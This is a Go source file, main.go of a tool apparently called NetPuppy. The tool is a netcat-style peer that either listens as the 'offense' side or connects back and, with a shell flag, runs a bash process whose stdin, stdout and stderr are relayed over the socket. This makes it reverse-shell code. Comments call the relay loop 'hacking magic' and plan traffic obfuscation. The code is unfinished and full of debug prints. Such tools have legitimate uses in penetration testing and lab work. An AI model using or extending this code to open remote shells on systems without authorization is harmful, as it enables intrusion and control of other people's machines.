package main

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"time"

	// NetPuppy modules:
	"netpuppy/utils"
)

func readFromUserShell(shellUserChannel chan<- string, stdout *io.ReadCloser, stderr *io.ReadCloser) {
	/*
		Depending on if the shell process is true on the peer struct,
		we have 3 go routines: 2 for if the shell is true (readStdout, readStderr)
		and one if it's false (readUserInput)

		The go routines put data they get from their sources into the channel.
		Think of the user and the shell as being treated the same by the peer...
	*/

	// Read data being outputed by the shell process (shell stdout):
	readForStdout := func(stdout *io.ReadCloser, shellUserChannel chan<- string) {
		// For loop checks for data in shell stdout:
		var readBuffer []byte = make([]byte, 1024)
		var numBytesRead int = 0
		var fullData []byte
		var dereferencedStdout io.ReadCloser = *stdout

		fmt.Printf("Stdout address in go routine = %p\n", stdout)

		for {
			numBytesRead, err := io.ReadFull(dereferencedStdout, readBuffer)
			if err == nil {
				// Set chunk to data read:
				dataChunk := readBuffer[:numBytesRead]

				// Add chunk to whole
				fullData = append(fullData, dataChunk...)

				// Reset buffer:
				readBuffer = make([]byte, 1024)
			} else {
				// Check for EOF & ErrUnexpectedEOF from io package (want to continue)
				//....... (type assertion time)
				if errors.Is(err, io.EOF) {
					//fmt.Println("Error is EOF")

					// Make sure there is something read from stderr before putting in channel:
					if len(fullData) > 0 {
						fmt.Printf("full data in stdout in io.EOF: %v\n", string(fullData))
						shellUserChannel <- string(fullData)

						// Reset fullData & continue:
						fullData = []byte{}
						continue
					}
				} else if errors.Is(err, io.ErrUnexpectedEOF) {
					// There is data in numBytesRead, add to data chunk
					dataChunk := readBuffer[:numBytesRead]

					// Add chunk to whole:
					fullData = append(fullData, dataChunk...)

					// Send down channel:
					shellUserChannel <- string(fullData)

					// Reset:
					fullData = []byte{}

					fmt.Println("Error is unexpected EOF")
					continue
				} else {
					log.Fatalf("Error reading from Stderr: %v\n", err)
				}
			}
		}
		fmt.Println(string(numBytesRead))
		// // Wait? (may need Cmd.Wait() here)
		// close channel? GRACEFULLY>!>!

		// for {
		// 	fmt.Printf("Go routin stdout for loop\n")
		// 	outData, err := io.ReadAll(*stdout) // Dereference the stdout pointer to get the actual value @ the address in memory
		// 	if err != nil {
		// 		fmt.Printf("Error reading data from stdout pipe: %v\n", err)
		// 		os.Stderr.WriteString(err.Error() + "\n")
		// 		os.Exit(1)
		// 	}
		// 	// If data: change to string & put into channel:
		// 	if len(outData) > 0 {
		// 		fmt.Printf("stdout: %s\n", string(outData))
		// 		cData := string(outData)
		// 		shellUserChannel <- cData
		// 	}
		// }
		// // Wait? (may need Cmd.Wait() here)
	}

	// Read ERROR data being outputed by the shell process (stderr):
	readForStderr := func(stderr *io.ReadCloser, shellUserChannel chan<- string) {
		// For loop checks for data in shell stderr:
		var readBuffer []byte = make([]byte, 1024)
		var numBytesRead int = 0
		var fullData []byte
		var dereferencedStderr io.ReadCloser = *stderr

		fmt.Printf("stderr address in go routine = %p\n", stderr)

		for {
			numBytesRead, err := io.ReadFull(dereferencedStderr, readBuffer)
			if err == nil {
				// Set chunk to data read:
				dataChunk := readBuffer[:numBytesRead]

				// Add chunk to whole
				fullData = append(fullData, dataChunk...)

				// Reset buffer:
				readBuffer = make([]byte, 1024)
			} else {
				// Check for EOF & ErrUnexpectedEOF from io package (want to continue)
				//....... (type assertion time)
				if errors.Is(err, io.EOF) {
					//fmt.Println("Error is EOF")

					fmt.Printf("full data in stderr in io.EOF: %v\n", string(fullData))
					// Make sure there is something read from stderr before putting in channel:
					if len(fullData) > 0 {
						shellUserChannel <- string(fullData)

						// Reset fullData & continue:
						fullData = []byte{}
						continue
					}
				} else if errors.Is(err, io.ErrUnexpectedEOF) {
					// There is data in numBytesRead, add to data chunk
					dataChunk := readBuffer[:numBytesRead]

					// Add chunk to whole:
					fullData = append(fullData, dataChunk...)

					// Send down channel:
					shellUserChannel <- string(fullData)

					// Reset:
					fullData = []byte{}

					fmt.Println("Error is unexpected EOF")
					continue
				} else {
					log.Fatalf("Error reading from Stderr: %v\n", err)
				}
			}
		}
		fmt.Println(string(numBytesRead))
		// // Wait? (may need Cmd.Wait() here)
		// close channel? GRACEFULLY>!>!
	}

	// If there's no shell (or we're the offense peer), get data from the user instead:
	readForUserInput := func(reader *bufio.Reader, shellUserChannel chan<- string) {
		// For loop checks for input from user:
		for {
			fmt.Println("For loop for reading user input.")
			fmt.Print(">> ")
			text, _ := reader.ReadString('\n')

			// If there is input, put into channel:
			if len(text) > 0 {
				fmt.Printf("user: %s\n", string(text))
				shellUserChannel <- text
			}
		}
	}

	// If the stdout param is not nil, that means we have a shell process AND we're the connect-back peer:
	if stdout != nil {
		fmt.Printf("stdout/ stderr address in readFromUSerShell = %p/%p\n", stdout, stderr)
		// Start separate go routines for capturing data from the shell:
		go readForStderr(stderr, shellUserChannel)
		go readForStdout(stdout, shellUserChannel)

	} else { // if shellProcess is nil, then just start go routine for getting user input:
		var reader *bufio.Reader = bufio.NewReader(os.Stdin)
		go readForUserInput(reader, shellUserChannel)
	}
}

func readFromSocket(socketChannel chan<- []byte, connection utils.Socket) {
	/*
		The socketChannel is for gathering & channeling data
		COMING IN from the socket to this peer. NP is reading the socket
		here and putting the data in that channel.
	*/

	fmt.Printf("Socket address in go routine = %p\n", connection)
	// Read from connection socket:
	for {
		//fmt.Println("For loop for reading from socket.")
		dataReadFromSocket, err := connection.Read()
		if err != nil {
			// Check for timeout error on conneciton:
			if err.Error() == "custom timeout error" {
				// If the socket timed out, AND data returned, put the data in the channel
				if len(dataReadFromSocket) > 0 {

					fmt.Printf("data read from socket: %s\n", string(dataReadFromSocket))
					//fmt.Printf("putting into socketChannel: %s\n", string(dataReadFromSocket))
					socketChannel <- dataReadFromSocket
				}

				continue
			} else if err.Error() == "EOF" {
				continue
			} else {
				log.Fatalf("Error reading from socket: %v\n", err.Error())
			}
		}

		// fmt.Printf("For loop\n")
		// dataChunk, err := connection.Read()

		// fmt.Printf("Data chunk in readFromSocket: %s\n", string(dataChunk))
		// if err != nil {
		// 	// ERROR HERE: if there si nothing in the socket, we put things in the channel?
		// 	if err == io.EOF && len(dataChunk) > 0 {
		// 		fmt.Printf("Bytes from socket: %v\n", dataWhole)
		// 		socketChannel <- dataWhole
		// 		dataWhole = []byte{}
		// 		continue
		// 	}
		// 	fmt.Printf("Error reading from socket: %v\n", err)
		// 	os.Stderr.WriteString(err.Error())
		// 	os.Exit(1)
		// 	return
		// }
		// dataWhole = append(dataWhole, dataChunk...)

		// // If data is not empty:
		// // if len(dataBytes) > 0 {
		// // 	fmt.Printf("Bytes from socket: %v\n", dataBytes)
		// // 	socketChannel <- dataBytes
		// // }
	}
}

func runApp(c utils.ConnectionGetter) {
	// Parse flags from user, attach to struct:
	flagStruct := utils.GetFlags()

	// Print banner:
	fmt.Printf("%s", utils.Banner())

	// Create peer instance based on user input:
	var socket utils.Socket
	// POINTER: thisPeer is a pointer to the actual instance of Peer returned by CreatePeer:
	var thisPeer *utils.Peer = utils.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)
	fmt.Printf("Address of peer in main.go = %p\n", thisPeer)

	// Update user:
	var updateUserBanner string = utils.UserSelectionBanner(thisPeer.ConnectionType, thisPeer.Address, thisPeer.RPort, thisPeer.LPort)
	fmt.Println(updateUserBanner)

	// Make connection:
	if thisPeer.ConnectionType == "offense" {
		socket = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
		//fmt.Printf("Socket address in main.go = %p\n", socket)
	} else {
		socket = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address)
	}

	// Set read deadline on socket (timeout after x time while trying to read socket):
	socket.SetSocketReadDeadline(300)
	fmt.Printf("Address of socket in main.go: %p\n", socket)

	// Connect socket connection to peer
	thisPeer.Connection = socket
	fmt.Printf("Address of socket on peer struct = %p\n", thisPeer.Connection)

	// If shell flag is true, start shell:
	var shell utils.BashShell
	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
		var realShellGetter utils.RealShellGetter
		//fmt.Printf("This peer shell: %v\n", thisPeer.Shell)

		shell = realShellGetter.GetConnectBackInitiatedShell()
		fmt.Printf("Address of shell in main.go: %p\n", shell)

		// Connect shell to peer:
		// Get pointer to shell underlying interface:
		//shellPointer := shell.(*utils.RealShell)
		thisPeer.ShellProcess = shell
		fmt.Printf("address of shell on peer struct (main.go) = %p\n", thisPeer.ShellProcess)
	}

	// Update banner w/ missing port:
	// var missingPortInBanner = utils.PrintMissingPortToBanner(thisPeer.ConnectionType, thisPeer.Connection)
	// fmt.Println(missingPortInBanner)

	// Start SIGINT go routine & start channel to listen for SIGINT:
	listenForSIGINT(thisPeer)

	var stdin *io.WriteCloser
	var stdout *io.ReadCloser
	var stderr *io.ReadCloser

	// Read channels:
	socketChannel := make(chan []byte)
	shellUserChannel := make(chan string)

	// Write channel:
	//stdinChannel := make(chan string)

	// If this peer is connect-back & has a shell: get pipes for shell & start the shell process:
	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
		// Hook up the pipes & return pointers to them:
		stdout = thisPeer.ShellProcess.PipeStdout()
		fmt.Printf("Stdout address (main.go) = %p\n", stdout)
		derefStdout := *stdout
		defer derefStdout.Close()

		stdin = thisPeer.ShellProcess.PipeStdin()
		fmt.Printf("Stdin address (main.go) = %p\n", stdin)
		var derefStdin io.WriteCloser = *stdin
		defer derefStdin.Close()

		stderr = thisPeer.ShellProcess.PipeStderr()
		fmt.Printf("Stderr address (main.go) = %p\n", stderr)
		derefStderr := *stderr
		defer derefStderr.Close()

		// Start shell:
		erR := thisPeer.ShellProcess.StartShell()
		if erR != nil {
			log.Fatalf("Error starting shell process: %v\n", erR)
		}
		fmt.Printf("Address of shell process after start (main.go) = %p\n", thisPeer.ShellProcess)

		// var waitErr error = thisPeer.ShellProcess.Wait()
		// if waitErr != nil {
		// 	log.Fatalf("Error calling shell.Wait() method: %v\n", waitErr)
		// }

		// Functions to handle stdin & stdout:
		readFromUserShell(shellUserChannel, stdout, stderr)
		//go writeToShellStdin(stdinChannel, stdin)

	} else {
		// If this peer does not need a shell, start go routine to read user input:
		readFromUserShell(shellUserChannel, nil, nil)
		//stdinChannel = nil
	}

	// Start go routine for reading from socket:
	go readFromSocket(socketChannel, thisPeer.Connection)

	/*
			This for loop is where all the hacking magic happens.
			We use select statements to check if either channel has
			data in it.

			1) shellUserChannel: will have EITHER data from the user (input)
				or data from the shell process (stdout/stderr)
			2) socketChannel: will have data coming inbound through the socket

			If either has data in it, we do things to it and move on. If no data,
			there is a small timeout as default.


		TO DO":::::
			- send the entire commaand (or capture the entire command)
			- decode
			- fix output on target (obfuscate over the wire)
				- mitm....
				- ssh server/client in go std lib ( or non standard protocol)
			- io reader loop


	*/
	for {
		//fmt.Printf("select for loop\n")
		select {
		// Read shellUserChannel and write the data to the socket:
		case socketOutgoing := <-shellUserChannel:
			// NEED TO: fix encoding/ decoding
			if len(socketOutgoing) > 3 {
				fmt.Printf("Data in shell user channel: %s\n", string(socketOutgoing))
				_, err := thisPeer.Connection.Write([]byte(socketOutgoing))

				if err != nil {
					// Quit here?
					fmt.Printf("Error in userInput select: %v\n", err)
					os.Stderr.WriteString(" " + err.Error() + "\n")
				}
			}

			// Read socketChannel & print to user OR redirect to shell process stdin:
		case socketIncoming := <-socketChannel:
			fmt.Printf("Socket incoming: %s\n", string(socketIncoming))
			// Convert bytes to string:
			sendString := string(socketIncoming)

			// If we have a cb shell & we're connect-back peer, data received from socket should be sent to shell stdin:
			if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
				//	io.WriteString wants to defer the closer so we dereference stdin:
				var dereferenceForCloseMethod io.WriteCloser = *stdin
				//defer dereferenceForCloseMethod.Close()

				fmt.Printf("Writing '%s' to shell stdin\n", sendString)

				intReturn, err := io.WriteString(dereferenceForCloseMethod, sendString)
				if err != nil {
					log.Fatalf("Error writing to stdin: %v\n", err)
				}
				fmt.Printf("Intreturn from stdin write: %d\n", intReturn)

				// go func(dereferenceForCloseMethod io.WriteCloser, s string) {
				// 	// Write socket data to shell stdin:
				// 	//defer dereferenceForCloseMethod.Close()
				// 	_, err := io.WriteString(dereferenceForCloseMethod, s)
				// 	if err != nil {
				// 		log.Fatalf("Error writing socket data to shell stdin (main.go): %v\n", err)
				// 	}
				// }(dereferenceForCloseMethod, sendString)

			} else {
				// Print data from socket channel to user:
				_, err := os.Stdout.Write(socketIncoming)
				if err != nil {
					// Quit here?
					fmt.Printf("Error in writing to stdout (main.go): %v\n", err)
					os.Stderr.WriteString(" " + err.Error() + "\n")
				}
			}
		default:
			time.Sleep(300 * time.Millisecond)
		}
	}
}

func listenForSIGINT(thisPeer *utils.Peer) { // POINTER: passing Peer by reference (we ACTUALLY want to close it)
	// If SIGINT: close connection, exit w/ code 2
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	go func() {
		for sig := range signalChan {
			if sig.String() == "interrupt" {
				fmt.Printf("signal: %v\n", sig)
				thisPeer.Connection.Close()
				os.Exit(2)
			}
		}
	}()
}

func main() {
	// In order to test the connection code w/o creating REAL sockets, runApp() handles most of the logic:
	var realConnection utils.RealConnectionGetter
	runApp(realConnection)
}
